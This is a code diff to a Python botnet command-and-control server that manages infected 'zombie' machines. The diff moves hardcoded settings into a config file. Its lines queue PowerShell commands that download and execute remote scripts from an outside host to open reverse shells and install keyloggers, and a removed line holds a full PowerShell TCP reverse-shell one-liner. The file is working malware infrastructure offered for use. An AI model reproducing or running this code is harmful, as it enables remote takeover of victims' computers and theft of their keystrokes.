@@ -5,9 +5,11 @@ import bcrypt
 from prettytable import PrettyTable
 import threading
 import urllib.request
+import config
 
-
-external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+# Gets external IP
+# Currently not used
+# external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
 
 
 
@@ -23,6 +25,8 @@ def list_zombies(socket):
 
 	socket.send(x.get_string().encode())
 
+
+# Commands entered must have quotes escaped with '\'
 def execute_command(socket):
 	socket.send(b'Please choose a zombie to command by specifying his id: ')
 	choice = int(socket.recv(2048).decode('utf-8'))
@@ -36,6 +40,7 @@ def execute_command(socket):
 	for command in z.command_cue:
 		socket.send((command+'\n').encode())
 
+# Uses modified version of Nishang shell
 def spawn_shell(socket):
 	socket.send(b'Please choose a zombie to command by specifying his id: ')
 	choice = int(socket.recv(2048).decode('utf-8'))
@@ -46,17 +51,16 @@ def spawn_shell(socket):
 	socket.send(b'\nOpen a netcat listener on the selected port and press "enter" to continue.\nThe zombie will try to connect to your public IP.')
 	socket.recv(2048).decode('utf-8')
 	socket.send(b'\nPress ctrl+c to exit the shell. Dont enter exit or zombie will die!!!\n')
-	#z.command_cue.append("$client = New-Object System.Net.Sockets.TCPClient(\\\""+external_ip+"\\\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
-	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://220.ip-54-37-16.eu/rev.txt\\\"))")
-	# IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerUp.ps1')
+	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://"+config.domain+"/rev.txt\\\"))")
 
+# Uses C# .net code
 def install_keylogger(socket):
 	socket.send(b'Please choose a zombie to install keylogger by specifying his id: ')
 	choice = int(socket.recv(2048).decode('utf-8'))
 	z = listener.zombies[choice]
 	socket.send(('Zombie with uuid: '+z.uuid+' is selected.\n').encode())
 	socket.send(b'\nResults of the keylogger can be found on the zombie machine in %TEMP%\\keylogger.txt\n')
-	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://220.ip-54-37-16.eu/key.txt\\\"))")
+	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://"+config.domain+"/key.txt\\\"))")
 
 def empty_zombie_list(socket):
 	listener.zombies = []
@@ -101,7 +105,7 @@ class ClientThread(threading.Thread):
 		# Hash a password for the first time, with a randomly-generated salt
 		# hashed = bcrypt.hashpw(password, bcrypt.gensalt())
 		# print(hashed)
-		hash = b'$2b$12$5f2z5D3nmeGV0bVOKmJlXuM0ncQXHu9IokJWe/XZZEVc4cxUV3sZS'
+		hash = config.bcrypt_password_hash
 		self.clientsocket.send(b'Please enter password: ')
 		password = self.clientsocket.recv(2048)
 		if not bcrypt.checkpw(password, hash):
@@ -136,7 +140,7 @@ def start():
 	# unblock socket for reuse
 	serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	# bind the socket
-	serversocket.bind(("0.0.0.0", 51251))
+	serversocket.bind((config.server_bind_ip, config.server_bind_port))
 	# become a server socket
 	serversocket.listen(5)
 	
